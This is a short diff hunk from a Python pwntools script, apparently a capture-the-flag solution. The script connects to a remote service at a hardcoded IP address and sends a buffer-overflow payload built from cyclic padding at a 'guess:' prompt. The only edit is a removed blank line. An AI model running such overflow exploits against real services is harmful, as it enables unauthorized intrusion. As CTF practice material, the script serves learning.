@@ -9,7 +9,6 @@ context.log_level = "debug"
 io = remote("111.230.149.72", 10002)
 
 payload = cyclic(0x10C + 0x8) + p32(0)
-
 io.sendlineafter("guess:", payload)
 print io.recvall()
 io.close()
